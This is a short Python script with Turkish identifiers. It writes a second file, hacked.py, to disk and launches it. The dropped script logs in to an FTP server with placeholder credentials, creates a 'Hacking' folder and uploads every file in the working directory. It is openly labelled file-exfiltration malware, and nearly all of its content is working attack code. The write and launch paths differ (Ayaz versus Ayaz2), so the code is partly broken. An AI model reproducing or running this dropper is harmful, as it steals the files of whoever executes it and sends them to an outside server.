import os
def olustur():
    stal = open("C:\Ayaz\cw\hacked.py", "w")
    stal.write("""import os
import ftplib
import threading


class Mainloop(threading.Thread):
    def run(self):
        connect = ftplib.FTP("sunucu","kullanici_adi","sifre")
        connect.mkd("Hacking")
        connect.cwd("Hacking")

        klasor = "."
        cout = 0
        for i in os.listdir(klasor):
            dosya = os.path.join(klasor,i)
            if os.path.isfile(dosya):
                cout = cout + 1
                f = file(i,'rb')
                connect.storbinary('STOR '+i,f)
t = Mainloop()
t.start()
""")
    stal.close()
    os.chdir("C:\\Ayaz2\\cw")
    os.startfile("C:\Ayaz2\cw\hacked.py")
    
